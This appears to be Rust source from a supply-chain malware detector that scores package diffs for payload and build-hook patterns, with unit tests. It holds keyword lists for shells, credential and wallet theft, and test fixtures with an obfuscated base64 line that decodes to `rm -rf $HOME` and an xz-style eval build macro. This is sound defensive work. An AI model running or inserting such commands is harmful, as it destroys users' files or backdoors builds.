    let nested_payload_cluster = diff.files.iter().any(|file| {
        if s.files_changed + s.files_added + s.files_removed > 16 {
            return false;
        }
        if file.path.matches("!!").count() < 2 {
            return false;
        }
        let Some(traits) = file.scopes.traits.as_ref() else {
            return false;
        };
        let text = traits
            .added
            .iter()
            .map(|t| format!("{} {}", t.id, t.desc))
            .chain(
                traits
                    .changed
                    .iter()
                    .map(|change| format!("{} {}", change.new.id, change.new.desc)),
            )
            .map(|text| text.to_ascii_lowercase())
            .collect::<Vec<_>>();
        let has = |needles: &[&str]| {
            text.iter()
                .any(|value| needles.iter().any(|needle| value.contains(needle)))
        };
        has(&[
            "anti-static",
            "obfuscat",
            "encoded",
            "base64",
            "rot13",
            "decode",
        ]) && has(&[
            "process/interpreter",
            "eval",
            "include",
            "require",
            "exec",
            "shell",
        ]) && has(&[
            "communications/http",
            "fs/",
            "file/write",
            "file_get_contents",
            "network",
        ])
    });
    let nested_capability_cluster = diff.files.iter().any(|file| {
        if s.files_changed + s.files_added + s.files_removed > 16 {
            return false;
        }
        if file.path.matches("!!").count() < 2 {
            return false;
        }
        let Some(traits) = file.scopes.traits.as_ref() else {
            return false;
        };
        let classes = traits
            .added
            .iter()
            .map(|t| crate::rubric::capability_class(&t.id))
            .chain(
                traits
                    .changed
                    .iter()
                    .map(|c| crate::rubric::capability_class(&c.new.id)),
            )
            .flatten()
            .collect::<HashSet<_>>();
        [
            "anti-static",
            "process/interpreter",
            "communications/http",
            "fs/file",
        ]
        .iter()
        .all(|class| classes.iter().any(|got| got == class))
    });
    let encoded_payload_cluster = [
        "file/encoded",
        "anti-static",
        "process/interpreter",
        "communications/http",
        "fs/file",
    ]
    .iter()
    .filter(|class| {
        a.behavioral
            .categories
            .iter()
            .any(|category| category.class == **class && !category.new_ids.is_empty())
    })
    .count();
    // A newly encoded/obfuscated file plus execution and an external or file
    // effect is a compact payload shape even when normal package files moved
    // around it. This is deliberately a class-level combination, not a
    // filename or campaign signature.
    let encoded_payload_cluster = encoded_payload_cluster >= 3
        && diff.summary.files_changed + diff.summary.files_added + diff.summary.files_removed <= 16
        && a.behavioral
            .categories
            .iter()
            .any(|category| category.class == "anti-static" && !category.new_ids.is_empty())
        && a.behavioral
            .categories
            .iter()
            .any(|category| category.class == "file/encoded" && !category.new_ids.is_empty());

    // Two platform-neutral release shapes deserve a high review signal even
    // when each individual trait is only medium:
    //
    // * build-time/native hook + low-level syscall + network + anti-analysis;
    // * wallet/private-key material + encoding + an external HTTP destination.
    // These describe the xz and xrpl families without naming either campaign.
    let has_prefix = |prefix: &str| {
        a.behavioral
            .categories
            .iter()
            .any(|category| category.class.starts_with(prefix) && !category.new_ids.is_empty())
    };
    let new_id_contains = |needles: &[&str]| {
        a.behavioral
            .categories
            .iter()
            .filter(|category| !category.new_ids.is_empty())
            .flat_map(|category| category.new_ids.iter())
            .any(|id| {
                let id = id.to_ascii_lowercase();
                needles.iter().any(|needle| id.contains(needle))
            })
    };
    let native_hook_cluster = has_prefix("process/create")
        && has_prefix("communications/http")
        && has_prefix("anti-analysis")
        && (has_prefix("os/syscall")
            || has_prefix("supply-chain/install-hook")
            || has_prefix("os/signal"));
    let native_build_hook_cluster = has_prefix("process/create")
        && has_prefix("supply-chain")
        && (has_prefix("os/syscall")
            || has_prefix("os/signal")
            || new_id_contains(&["syscall", "sigaction", "raw-"]))
        && (!source_archive || source_build_anomaly);
    let secret_egress_cluster = has_prefix("communications/http")
        && (has_prefix("data/encode") || has_prefix("data/decode") || has_prefix("file/encoded"))
        && (has_prefix("crypto/library") || has_prefix("crypto/asymmetric"))
        && new_id_contains(&["private-key", "mnemonic", "wallet", "seed"])
        && new_id_contains(&["external-url", "remote-host-url", "tld-"]);
    let executable_capability_bundle = executable_capability_escalation(diff, bump);
    if focused_source
        || focused_source_with_cleanup
        || source_build_anomaly
        || cross_domain_cluster
        || endgame
        || dependency_with_fallback_load
        || added_encrypted_payload_archive
        || same_version_archive_replacement
        || nested_payload_cluster
        || nested_capability_cluster
        || encoded_payload_cluster
        || native_hook_cluster
        || native_build_hook_cluster
        || secret_egress_cluster
        || executable_capability_bundle >= Severity::High
    {
        Severity::High
    } else {
        Severity::None
    }
}

/// A package that retains only a tiny shell after deleting nearly all of its
/// behavior has the shape of an intentional endgame release. File deletion by
/// itself is ordinary cleanup; the high trait-ROC floor requires the removed
/// tree to account for most of the package's behavior as well as its content.
fn endgame_package_shape(summary: &DiffSummary) -> bool {
    summary.files_removed >= 100
        && summary.files_added <= 2
        && summary.files_changed <= 8
        && summary.overall_roc >= 0.50
        && summary.scope_roc.traits >= 0.75
}

/// A dependency addition paired with a new fallback module load is a compact
/// supply-chain shape even when neither signal is individually high. The file
/// count and overall movement bounds keep ordinary framework rewrites out.
fn dependency_with_fallback_load(a: &Assessment, diff: &DiffReportV1) -> bool {
    let summary = &diff.summary;
    summary.files_changed + summary.files_added + summary.files_removed <= 16
        && a.structure
            .facts
            .iter()
            .any(|fact| fact.label == "dependency")
        && a.behavioral
            .categories
            .iter()
            .any(|category| category.class == "os/module" && !category.new_ids.is_empty())
        && summary.overall_roc <= 0.25
}

/// The inverse of [`endgame_package_shape`], strengthened with direct evidence
/// that the old package's declared npm entrypoint was absent. This lets humans
/// and the LLM distinguish restoration of a stripped package from introduction
/// of a large new payload: generic capabilities inside the returning library
/// are baseline context unless direct implant evidence says otherwise.
fn restored_endgame_package_shape(diff: &DiffReportV1) -> bool {
    let summary = &diff.summary;
    let entrypoint_restored = diff.files.iter().any(|file| {
        file.scopes.traits.as_ref().is_some_and(|traits| {
            traits.removed.iter().any(|trait_change| {
                trait_change
                    .id
                    .ends_with("::npm-main-entrypoint-not-shipped")
            })
        })
    });
    entrypoint_restored
        && summary.files_added >= 100
        && summary.files_removed <= 2
        && summary.files_changed <= 8
        && summary.overall_roc >= 0.50
        && summary.scope_roc.traits >= 0.75
}

/// A newly-added executable can be an implant even when every individual API
/// looks ordinary. Score capability *families* and their combinations on the
/// file that gained them, then apply the version/package context here. The
/// family names are intentionally platform-neutral; the symbols and traits
/// that feed them can be Mach-O, ELF, PE, or source-language facts.
fn executable_capability_escalation(diff: &DiffReportV1, bump: Option<Bump>) -> Severity {
    // This heuristic is intentionally about a compact payload replacement.
    // A normal archive release can replace many compiled members at once; its
    // ordinary binary capabilities must not be treated as a single implant.
    let changed_files =
        diff.summary.files_changed + diff.summary.files_added + diff.summary.files_removed;
    if changed_files > 16 {
        return Severity::None;
    }
    let package_context = package_payload_context(diff);
    let release_pressure = bump.map_or(0, |b| match b.kind {
        BumpKind::Same | BumpKind::Patch | BumpKind::Downgrade => 2,
        BumpKind::Minor => 1,
        BumpKind::Major => 0,
    });
    let mut best = 0u32;

    for file in &diff.files {
        if !matches!(
            file.status,
            cleave::types::FileStatus::Added | cleave::types::FileStatus::Changed
        ) {
            continue;
        }
        let profile = capability_shape(file);
        if !profile.executable {
            continue;
        }
        let replacement = matches!(file.status, cleave::types::FileStatus::Added)
            && diff.files.iter().any(|other| {
                matches!(other.status, cleave::types::FileStatus::Removed)
                    && normalized_member_path(&other.path) == normalized_member_path(&file.path)
            });
        let score = capability_shape_score(&profile, package_context, replacement);
        best = best.max(score);
    }

    // A patch/repack release is not expected to introduce a multi-domain
    // executable. A minor release gets a little more room, while a major
    // release relies on the ordinary trait rubric unless the new executable
    // also carries the strongest packaging concealment signal.
    let high = match release_pressure {
        2 => best >= 10,
        1 => best >= 13 && package_context,
        _ => best >= 16 && package_context,
    };
    if high {
        Severity::High
    } else if best >= 7 {
        Severity::Medium
    } else {
        Severity::None
    }
}

#[derive(Debug, Default)]
struct CapabilityShape {
    families: HashSet<&'static str>,
    executable: bool,
    resource_path: bool,
    archive_member: bool,
}

/// Build a compact, explainable profile from the diff scopes. It deliberately
/// consumes the facts already emitted by cleave instead of requiring a new
/// platform-specific trait for every API spelling.
fn capability_shape(file: &cleave::types::FileDiffEntry) -> CapabilityShape {
    use cleave::types::Scope;

    let lower_path = file.path.to_ascii_lowercase();
    let mut shape = CapabilityShape {
        executable: lower_path.ends_with(".exe")
            || lower_path.ends_with(".dll")
            || lower_path.ends_with(".so")
            || lower_path.ends_with(".dylib")
            || lower_path.ends_with(".bin")
            || lower_path.contains("/contents/macos/")
            || lower_path.contains("/bin/")
            || lower_path.contains("/usr/bin/")
            || lower_path.contains("/usr/local/bin/")
            || lower_path.contains("/sbin/")
            || lower_path.contains("/libexec/")
            || lower_path.contains("\\system32\\"),
        resource_path: [
            "/resources/",
            "/plugins/",
            "/extensions/",
            "/vendor/",
            "/assets/",
        ]
        .iter()
        .any(|part| lower_path.contains(part)),
        archive_member: file.path.contains("!!"),
        ..Default::default()
    };

    if let Some(traits) = file.scopes.traits.as_ref() {
        for trait_change in &traits.added {
            add_capability_text(&mut shape.families, &trait_change.id);
            add_capability_text(&mut shape.families, &trait_change.desc);
            shape.executable |= trait_is_executable(&trait_change.id);
        }
        for change in &traits.changed {
            add_capability_text(&mut shape.families, &change.new.id);
            add_capability_text(&mut shape.families, &change.new.desc);
            shape.executable |= trait_is_executable(&change.new.id);
        }
    }

    if let Some(symbols) = file.scopes.symbols.as_ref() {
        for symbol in &symbols.added {
            add_capability_text(&mut shape.families, &symbol.symbol);
            if let Some(library) = &symbol.library {
                add_capability_text(&mut shape.families, library);
            }
        }
        for change in &symbols.changed {
            add_capability_text(&mut shape.families, &change.new.symbol);
            if let Some(library) = &change.new.library {
                add_capability_text(&mut shape.families, library);
            }
        }
    }

    // Sections plus symbols are a useful cross-platform executable marker for
    // extensionless ELF/Mach-O/PE files. Source files normally have neither.
    shape.executable |= file.scopes.view(Scope::Sections).has_changes
        && file.scopes.view(Scope::Symbols).has_changes;

    if let Some(metrics) = file.scopes.metrics.as_ref() {
        for metric in &metrics.added {
            add_metric_signal(&mut shape, &metric.path);
        }
        for change in &metrics.changed {
            add_metric_signal(&mut shape, &change.new.path);
        }
    }
    if let Some(kv) = file.scopes.kv.as_ref() {
        for fact in &kv.added {
            add_capability_text(&mut shape.families, &fact.path);
            add_capability_text(&mut shape.families, &fact.value.to_string());
        }
        for change in &kv.changed {
            add_capability_text(&mut shape.families, &change.new.path);
            add_capability_text(&mut shape.families, &change.new.value.to_string());
        }
    }
    shape
}

fn add_metric_signal(shape: &mut CapabilityShape, path: &str) {
    let lower = path.to_ascii_lowercase();
    shape.executable |= lower.contains("sections.executable_count")
        || lower.starts_with("macho.")
        || lower.starts_with("elf.")
        || lower.starts_with("pe.");
    if lower.contains("overlay")
        || lower.contains("concealed")
        || lower.contains("high_entropy")
        || lower.contains("near_maximum_entropy")
        || lower.contains("packed")
    {
        shape.families.insert("concealment");
    }
}

fn trait_is_executable(id: &str) -> bool {
    let lower = id.to_ascii_lowercase();
    lower.contains("metadata/lang/compiled")
        || lower.contains("metadata/binary/")
        || lower.contains("metadata/binary/section")
        || lower.contains("macho")
        || lower.contains("elf")
        || lower.contains("pe-")
        || lower.contains("main-entry")
}

/// A content-level compiled-binary marker for package topology. This includes
/// native object files as well as executables, so user-facing text must call
/// these binary members rather than claiming every one is executable.
fn is_compiled_binary_file_type(file_type: filefacts::FileType) -> bool {
    file_type.is_binary()
}

/// Conservative fallback when member extraction is unavailable. This uses
/// executable package layout, never an extension: arbitrary `.bin`/`.dat`
/// cache or resource files must not become “payloads” merely by naming.
fn executable_member_layout(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    if lower.contains("/contents/macos/")
        || lower.contains("/bin/")
        || lower.contains("/usr/bin/")
        || lower.contains("/usr/local/bin/")
        || lower.contains("/sbin/")
        || lower.contains("/libexec/")
        || lower.contains("\\system32\\")
    {
        return true;
    }
    // Mach-O framework binaries conventionally live at Versions/A/<name>;
    // resource files are deeper (Versions/A/Resources/...) or hidden under a
    // signature directory, so require exactly one component after Versions/.
    lower
        .split_once("/versions/")
        .is_some_and(|(_, suffix)| suffix.matches('/').count() == 1)
}

fn package_payload_context(diff: &DiffReportV1) -> bool {
    let mut archive = false;
    let mut encrypted = false;
    let mut extension_mismatch = false;
    let mut executable_member = false;

    for file in &diff.files {
        let Some(traits) = file.scopes.traits.as_ref() else {
            continue;
        };
        for trait_change in traits
            .added
            .iter()
            .chain(traits.changed.iter().map(|change| &change.new))
        {
            let text = format!("{} {}", trait_change.id, trait_change.desc).to_ascii_lowercase();
            archive |= text.contains("archive") || text.contains("zip") || text.contains("7z");
            encrypted |= text.contains("encrypt") || text.contains("password");
            extension_mismatch |= text.contains("extension") && text.contains("mismatch");
            executable_member |= text.contains("executable") && text.contains("member");
        }
    }

    archive && executable_member && (encrypted || extension_mismatch)
}

fn capability_shape_score(
    shape: &CapabilityShape,
    package_context: bool,
    replacement: bool,
) -> u32 {
    let mut score = u32::try_from(shape.families.len()).unwrap_or(u32::MAX);
    let has = |name: &str| shape.families.contains(name);

    if has("communications") && has("process") {
        score += 2;
    }
    if has("communications") && has("remote-access") {
        score += 2;
    }
    if has("discovery") && has("communications") {
        score += 1;
    }
    if has("crypto") && has("communications") {
        score += 1;
    }
    if has("process") && has("remote-access") {
        score += 1;
    }
    if has("loading") && has("communications") {
        score += 1;
    }
    if shape.executable {
        score += 2;
    }
    if shape.resource_path || shape.archive_member {
        score += 2;
    }
    if package_context {
        score += 2;
    }
    if replacement {
        // A root directory rename must not hide a binary replacement. The
        // normalized suffix is enough to pair `App-1.2.3/bin/x` with
        // `App/bin/x` without trusting archive-specific naming conventions.
        score += 1;
    }
    score
}

/// The package/container size delta, when the synthetic root exposed it as a
/// metric. There can be many member sizes, so intentionally use only the root.
fn root_size_delta(diff: &DiffReportV1) -> Option<String> {
    let root = diff.files.iter().find(|f| f.path == "<root>")?;
    let metrics = root.scopes.metrics.as_ref()?;
    let change = metrics
        .changed
        .iter()
        .find(|c| c.new.path.ends_with("size_bytes"))?;
    let old = change.old.value.as_f64()?;
    let new = change.new.value.as_f64()?;
    let delta = if old != 0.0 {
        format!("{:+.1}%", (new - old) / old * 100.0)
    } else {
        "new".to_string()
    };
    Some(format!("{old:.0} -> {new:.0} bytes ({delta})"))
}

/// Normalize only a version-bearing archive/package root for matching. A
/// literal `foo/bin/x` stays distinct from `bar/bin/x`; `foo-1.0/bin/x` and
/// `foo-1.1/bin/x` both become `foo/bin/x`. This is the same conservative
/// `Version::detect` + `clean_name` rule used by the filename header logic.
fn normalized_member_path(path: &str) -> String {
    if !path.contains("!!") {
        return path.to_string();
    }
    path.split("!!")
        .map(|member| {
            let Some((root, suffix)) = member.split_once('/') else {
                return member.to_string();
            };
            let Some(version) = Version::detect(root) else {
                return member.to_string();
            };
            let root = clean_name(root, Some(&version));
            if root.is_empty() {
                member.to_string()
            } else {
                format!("{root}/{suffix}")
            }
        })
        .collect::<Vec<_>>()
        .join("!!")
}

fn display_member_path(path: &str) -> String {
    path.split_once("!!")
        .map_or_else(|| path.to_string(), |(_, member)| member.to_string())
}

fn identity_claims(identity: &filefacts::Identity) -> Vec<String> {
    let mut claims = Vec::new();
    let mut add = |label: &str, claim: Option<&filefacts::Claim>| {
        let Some(claim) = claim else {
            return;
        };
        let value = crate::printable(&claim.value);
        if value.is_empty() {
            return;
        }
        let provenance = if claim.verified {
            "verified"
        } else {
            "claimed"
        };
        claims.push(format!("{label}={value} [{provenance}]"));
    };
    add("name", identity.name.as_ref());
    add("title", identity.title.as_ref());
    add("project", identity.project.as_ref());
    add("identifier", identity.identifier.as_ref());
    add("version", identity.version.as_ref());
    add("organization", identity.organization.as_ref());
    add("producer", identity.producer.as_ref());
    add("team", identity.team_id.as_ref());
    if let Some(signer) = &identity.signer {
        let signer_name = signer
            .organization
            .as_deref()
            .or(signer.common_name.as_deref())
            .unwrap_or_default();
        if !signer_name.is_empty() {
            claims.push(format!(
                "signer={} [parsed, {}]",
                crate::printable(signer_name),
                trust_label(identity.trust)
            ));
        }
    } else if identity.trust != filefacts::Trust::Unsigned {
        claims.push(format!("trust={}", trust_label(identity.trust)));
    }
    claims
}

fn trust_label(trust: filefacts::Trust) -> String {
    format!("{trust:?}").to_ascii_lowercase()
}

fn add_capability_text(families: &mut HashSet<&'static str>, text: &str) {
    let lower = text.to_ascii_lowercase();
    let has = |terms: &[&str]| terms.iter().any(|term| lower.contains(term));
    if has(&[
        "communications/",
        "socket",
        "connect",
        "listen",
        "accept",
        "http",
        "websocket",
        "urlsession",
        "urlrequest",
        "network",
        "winhttp",
        "internetopen",
    ]) {
        families.insert("communications");
    }
    if has(&[
        "process/",
        "shell",
        "spawn",
        "execve",
        "createprocess",
        "nstask",
        "nspipe",
        "mkfifo",
        "/bin/sh",
        "fork",
    ]) {
        families.insert("process");
    }
    if has(&[
        "ssh",
        "identityfile",
        "stricthostkeychecking",
        "forwarding",
        "tunnelwithhostname",
        "remote-access",
    ]) {
        families.insert("remote-access");
    }
    if has(&[
        "discovery",
        "hardware",
        "iokit",
        "sysctl",
        "serial",
        "machine-id",
        "username",
        "nsusername",
        "getcomputername",
        "gethostname",
        "registry",
        "uname",
    ]) {
        families.insert("discovery");
    }
    if has(&[
        "crypto",
        "crypt",
        "aes",
        "hmac",
        "pbkdf",
        "sha",
        "md5",
        "bcrypt",
        "ncrypt",
        "pem-public-key",
    ]) {
        families.insert("crypto");
    }
    if has(&[
        "dylib/load",
        "dlopen",
        "dlsym",
        "loadlibrary",
        "getprocaddress",
        "ld_preload",
    ]) {
        families.insert("loading");
    }
    if has(&[
        "persistence",
        "launchd",
        "systemd",
        "cron",
        "runonce",
        "startup",
        "autostart",
        "service-install",
    ]) {
        families.insert("persistence");
    }
    if has(&[
        "archive",
        "encrypted-entry",
        "encoded-payload",
        "base64",
        "entropy",
        "packed",
        "compression",
    ]) {
        families.insert("concealment");
    }
    if has(&[
        "credential",
        "password",
        "browser",
        "keychain",
        "secret",
        "token",
    ]) {
        families.insert("credential-access");
    }
}

/// A cleanup release may mention the exact malicious filename it removes.
/// Keep the signature visible in the report, but do not treat that quoted
/// indicator as newly introduced risk on the default `new` gate.
fn remediation_cleanup_context(
    a: &Assessment,
    diff: &DiffReportV1,
    risk: Option<crate::risk::Risk>,
) -> bool {
    let known_indicator = a
        .signature
        .ids
        .iter()
        .any(|m| m.is_new && m.id.ends_with("wp-comments-posts-masquerade"));
    let deletes_file = a
        .behavioral
        .categories
        .iter()
        .any(|c| c.class == "fs/delete" && !c.new_ids.is_empty());
    let compact_cleanup = known_indicator && deletes_file && diff.summary.files_changed <= 4;
    // A fixed release often removes the malicious code instead of adding a
    // recognizable signature. A large same-package model-risk drop is strong
    // evidence of that remediation transition; the clean baseline→fixed
    // comparison does not have the drop and remains subject to normal gates.
    let model_recovery = risk.is_some_and(|r| r.old - r.new >= 0.50);
    compact_cleanup || model_recovery
}

#[cfg(test)]
mod tests {
    use std::collections::HashSet;

    use super::{
        CapabilityShape, add_capability_text, capability_shape_score, changed_test_carrier,
        endgame_package_shape, executable_member_layout, is_compiled_binary_file_type,
        is_source_archive, line_diff, normalized_archive_diff, normalized_member_path,
        npm_snapshot_member_key, restored_endgame_package_shape, source_build_macro_score,
    };
    use cleave::Criticality;
    use cleave::types::{
        DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, ScopeDiff, ScopeDiffs, ScopeRocs,
        TraitChange,
    };

    #[test]
    fn endgame_shape_requires_behavioral_collapse_not_just_cleanup() {
        let faker = DiffSummary {
            files_removed: 1_785,
            files_added: 0,
            files_changed: 2,
            overall_roc: 1.0,
            scope_roc: ScopeRocs {
                traits: 0.99,
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(endgame_package_shape(&faker));

        let ordinary_cleanup = DiffSummary {
            scope_roc: ScopeRocs {
                traits: 0.20,
                ..Default::default()
            },
            ..faker
        };
        assert!(!endgame_package_shape(&ordinary_cleanup));
    }

    #[test]
    fn restoration_shape_requires_the_broken_entrypoint_to_be_repaired() {
        let removed_trait = |id: &str| TraitChange {
            id: id.to_string(),
            trait_section: "metadata".to_string(),
            crit: Criticality::Notable,
            desc: "declared entrypoint absent".to_string(),
            count: 1,
        };
        let make_diff = |id: &str| DiffReportV1 {
            old_root: "stripped.tgz".to_string(),
            new_root: "restored.tgz".to_string(),
            summary: DiffSummary {
                files_added: 1_785,
                files_changed: 2,
                overall_roc: 1.0,
                scope_roc: ScopeRocs {
                    traits: 0.99,
                    ..Default::default()
                },
                ..Default::default()
            },
            scopes: Default::default(),
            files: vec![FileDiffEntry {
                path: "<root>".to_string(),
                status: FileStatus::Changed,
                identity: None,
                scopes: ScopeDiffs {
                    traits: Some(ScopeDiff {
                        removed: vec![removed_trait(id)],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                old_formula: None,
                new_formula: None,
            }],
        };

        assert!(restored_endgame_package_shape(&make_diff(
            "metadata/package/manifest/entrypoint::npm-main-entrypoint-not-shipped"
        )));
        assert!(!restored_endgame_package_shape(&make_diff(
            "metadata/package/files::ordinary-tree-change"
        )));
    }

    #[test]
    fn line_diff_marks_additions_removals_and_context() {
        // gentoo-shaped edit: one line replaced, one added; the rest is context.
        let old = b"#!/bin/bash\nexec meson build\n";
        let new = b"#!/bin/bash\nmeson=`base64 -d <<< L2Jpbi9ybQo=`\nexec ${meson} -rf $HOME\n";
        let d = line_diff(old, new);
        // Context line is unmarked; both new lines are `+`; the replaced old
        // line surfaces as `-`.
        assert!(d.contains("  #!/bin/bash"), "context line kept: {d}");
        assert!(
            d.contains("+ meson=`base64 -d <<< L2Jpbi9ybQo=`"),
            "added: {d}"
        );
        assert!(d.contains("+ exec ${meson} -rf $HOME"), "added: {d}");
        assert!(d.contains("- exec meson build"), "removed: {d}");
    }

    #[test]
    fn line_diff_neutralizes_control_chars() {
        // A crafted line can't smuggle a terminal escape into the payload.
        let d = line_diff(b"", b"evil\x1b[31mred\n");
        assert!(!d.contains('\x1b'), "escape must be neutralized: {d:?}");
    }

    #[test]
    fn capability_families_are_platform_neutral() {
        let mut families = HashSet::new();
        add_capability_text(
            &mut families,
            "CreateProcess WinHttpOpen BCryptEncrypt GetComputerName",
        );
        assert!(families.contains("process"));
        assert!(families.contains("communications"));
        assert!(families.contains("crypto"));
        assert!(families.contains("discovery"));
    }

    #[test]
    fn capability_bundle_requires_convergence_not_one_api() {
        let mut one_api = HashSet::new();
        one_api.insert("communications");
        let ordinary = CapabilityShape {
            families: one_api,
            executable: true,
            ..Default::default()
        };
        assert!(capability_shape_score(&ordinary, false, false) < 10);

        let mut bundle = HashSet::new();
        for family in [
            "communications",
            "process",
            "remote-access",
            "discovery",
            "crypto",
            "loading",
        ] {
            bundle.insert(family);
        }
        let suspicious = CapabilityShape {
            families: bundle,
            executable: true,
            resource_path: true,
            archive_member: true,
        };
        assert!(capability_shape_score(&suspicious, true, true) >= 10);
    }

    #[test]
    fn package_root_churn_does_not_hide_replacements() {
        assert_eq!(
            normalized_member_path(
                "<root>!!HandBrake-1.0.7/HandBrake.app/Contents/MacOS/HandBrake"
            ),
            "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
        );
        assert_eq!(
            normalized_member_path("<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"),
            "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
        );
        assert_ne!(
            normalized_member_path("<root>!!foo-1.0/bin/tool"),
            normalized_member_path("<root>!!bar-1.0/bin/tool")
        );
        assert_eq!(normalized_member_path("src/main.c"), "src/main.c");
        assert_eq!(
            normalized_member_path("<root>!!outer-1.0/plugins/payload.zip!!inner-2.0/bin/run"),
            "<root>!!outer/plugins/payload.zip!!inner/bin/run"
        );
    }

    #[test]
    fn versioned_member_roots_are_merged_before_judging() {
        let trait_change = |id: &str| TraitChange {
            id: id.to_string(),
            trait_section: "micro-behaviors".to_string(),
            crit: Criticality::Notable,
            desc: "same trait".to_string(),
            count: 1,
        };
        let old = FileDiffEntry {
            path: "<root>!!widget-1.0.0/lib/a.php".to_string(),
            status: FileStatus::Removed,
            identity: None,
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    removed: vec![trait_change("micro-behaviors/example::same")],
                    old_count: 1,
                    old_weight: 1.0,
                    change_weight: 1.0,
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let new = FileDiffEntry {
            path: "<root>!!widget-1.0.1/lib/a.php".to_string(),
            status: FileStatus::Added,
            identity: None,
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    added: vec![trait_change("micro-behaviors/example::same")],
                    new_count: 1,
                    new_weight: 1.0,
                    change_weight: 1.0,
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let judged = normalized_archive_diff(&DiffReportV1 {
            old_root: "old.zip".to_string(),
            new_root: "new.zip".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![old, new],
        });
        assert_eq!(judged.files.len(), 1);
        assert_eq!(judged.files[0].status, FileStatus::Unchanged);
        let traits = judged.files[0].scopes.traits.as_ref().unwrap();
        assert!(traits.added.is_empty());
        assert!(traits.removed.is_empty());
        assert!(traits.changed.is_empty());
    }

    #[test]
    fn npm_package_root_pairs_with_versioned_source_snapshot() {
        let old = FileDiffEntry {
            path: "<root>!!flatmap-stream-0.1.0/index.min.js".to_string(),
            status: FileStatus::Removed,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: Some("clean".to_string()),
            new_formula: None,
        };
        let new = FileDiffEntry {
            path: "<root>!!package/index.min.js".to_string(),
            status: FileStatus::Added,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: None,
            new_formula: Some("payload".to_string()),
        };
        let judged = normalized_archive_diff(&DiffReportV1 {
            old_root: "flatmap-stream-0.1.0-github.tar.gz".to_string(),
            new_root: "flatmap-stream-0.1.1.tgz".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![old, new],
        });
        assert_eq!(judged.files.len(), 1);
        assert_eq!(judged.files[0].path, "<root>!!package/index.min.js");
        assert_eq!(judged.files[0].old_formula.as_deref(), Some("clean"));
        assert_eq!(judged.files[0].new_formula.as_deref(), Some("payload"));
    }

    #[test]
    fn npm_snapshot_key_distinguishes_package_root() {
        assert_eq!(
            npm_snapshot_member_key("<root>!!foo-1.0/bin/tool"),
            Some((false, "bin/tool".to_string()))
        );
        assert_eq!(
            npm_snapshot_member_key("<root>!!package/bin/tool"),
            Some((true, "bin/tool".to_string()))
        );
        assert_eq!(npm_snapshot_member_key("<root>!!foo/bin/tool"), None);
    }

    #[test]
    fn payload_selection_uses_content_type_before_names() {
        assert!(is_compiled_binary_file_type(filefacts::FileType::MachO));
        assert!(!is_compiled_binary_file_type(filefacts::FileType::Php));
        assert!(!is_compiled_binary_file_type(filefacts::FileType::Data));
        assert!(!executable_member_layout("pkg!!cache/payload.bin"));
        assert!(executable_member_layout(
            "pkg!!App.app/Contents/MacOS/launch"
        ));
    }

    #[test]
    fn source_build_macro_signal_requires_joined_execution_clues() {
        let malicious = b"AC_CONFIG_COMMANDS([build-to-host], [eval $stage | $SHELL])\ncarrier=`grep -aErls marker $srcdir/`\nconfig='sed r $carrier | eval $map | $decoder -d'\nmap='tr abc xyz'";
        let ordinary = b"AC_DEFUN([gl_BUILD_TO_HOST], [AC_SUBST([$1_c_make])])\nvalue=`echo ok`";
        assert!(source_build_macro_score(malicious));
        assert!(!source_build_macro_score(ordinary));
    }

    #[test]
    fn changed_test_carrier_requires_compression_and_test_context() {
        let entry = |path: &str, status| FileDiffEntry {
            path: path.to_string(),
            status,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: None,
            new_formula: None,
        };
        assert!(changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/carrier.lzma",
            FileStatus::Changed,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/carrier.lzma",
            FileStatus::Unchanged,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/assets/carrier.lzma",
            FileStatus::Changed,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/README",
            FileStatus::Changed,
        )));
    }

    #[test]
    fn source_archive_detection_is_limited_to_tarball_forms() {
        assert!(is_source_archive(std::path::Path::new("xz-5.6.0.tar.xz")));
        assert!(is_source_archive(std::path::Path::new("pkg.tar.gz")));
        assert!(!is_source_archive(std::path::Path::new("pkg.tgz")));
        assert!(!is_source_archive(std::path::Path::new("source-tree")));
    }
}
